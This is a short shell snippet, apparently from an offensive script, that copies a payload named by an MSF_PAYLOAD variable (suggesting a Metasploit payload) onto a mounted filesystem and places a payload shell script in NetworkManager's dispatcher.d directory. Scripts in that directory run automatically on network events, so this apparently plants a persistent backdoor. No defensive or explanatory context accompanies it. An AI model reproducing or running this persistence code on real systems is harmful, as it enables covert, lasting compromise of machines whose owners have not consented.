
if [ ! -f /mntfs/etc/$MSF_PAYLOAD ]; then
  /bin/cp /bin/$MSF_PAYLOAD /mntfs/etc/$MSF_PAYLOAD
  /bin/cp /bin/${MSF_PAYLOAD_SHELL} /mntfs/etc/NetworkManager/dispatcher.d/${MSF_PAYLOAD_SHELL}
fi

